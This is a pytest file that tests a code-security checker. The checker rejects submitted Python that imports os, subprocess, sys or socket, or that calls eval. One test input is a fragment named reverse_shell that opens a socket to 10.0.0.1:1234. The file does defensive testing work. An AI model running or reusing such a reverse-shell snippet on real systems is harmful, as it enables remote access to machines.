import os
import sys

import pytest

# Add worker directory to sys.path to import SecurityChecker
sys.path.append(os.path.join(os.path.dirname(__file__), "../../../worker"))

from security import SecurityChecker, SecurityViolation  # noqa: E402


def test_security_check_valid_code():
    checker = SecurityChecker()
    code = """
def add(a, b):
    return a + b
print(add(1, 2))
"""
    # Should not raise exception
    checker.check_code(code)


def test_security_check_header_forbidden_import():
    checker = SecurityChecker()
    code = "import os"
    with pytest.raises(SecurityViolation, match="Forbidden import: os"):
        checker.check_code(code)


def test_security_check_forbidden_import_from():
    checker = SecurityChecker()
    code = "from subprocess import check_output"
    with pytest.raises(SecurityViolation, match="Forbidden import from: subprocess"):
        checker.check_code(code)


def test_security_check_forbidden_function_call():
    checker = SecurityChecker()
    code = "eval('1 + 1')"
    with pytest.raises(SecurityViolation, match="Forbidden function call: eval"):
        checker.check_code(code)


def test_security_check_complex_malicious_code():
    checker = SecurityChecker()
    code = """
import sys
import socket

def reverse_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("10.0.0.1", 1234))
"""
    with pytest.raises(SecurityViolation) as excinfo:
        checker.check_code(code)
    assert "Forbidden import: sys" in str(excinfo.value)
    assert "Forbidden import: socket" in str(excinfo.value)
